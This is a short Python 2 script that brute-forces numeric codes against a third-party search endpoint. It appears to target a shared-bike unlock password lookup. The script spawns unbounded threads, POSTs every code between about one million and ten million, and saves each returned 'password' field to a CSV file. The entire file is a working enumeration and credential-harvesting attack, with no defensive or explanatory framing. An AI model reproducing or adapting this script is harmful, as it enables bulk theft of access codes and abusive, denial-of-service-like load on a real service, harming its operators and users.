import thread
import time
import urllib
import urllib2
import json
import json
import urllib2
import urllib
import csv

out = open('output.csv', 'w')
csv_writer = csv.writer(out)
def postHttp(code):
  url="http://www.ofo114.com/search"

  postdata=dict(code=code)

  postdata=urllib.urlencode(postdata)
  try: #enable cookie
    request = urllib2.Request(url,postdata)
    response=urllib2.urlopen(request)
    result = json.loads(response.read())
  except:
    result = {u'msg': u'\u64cd\u4f5c\u5931\u8d25', u'code': u'failure', u'success': False}
    #print result
  if (result['code'] != 'failure') :
        b1 = result['password']
        
        print "i : "+str(code)+" b : "+ b1
        b = str(b1)
        csv_writer.writerow([code,b1])
 

def main():
    i = 1032767

    
    while i < 9999999:
     
     i = i + 2 
     i1 = i
     i2 = i - 1 
     #print i
     a1 = thread.start_new_thread(postHttp, (i1,))
     a2 = thread.start_new_thread(postHttp, (i2,))
     
     
main()
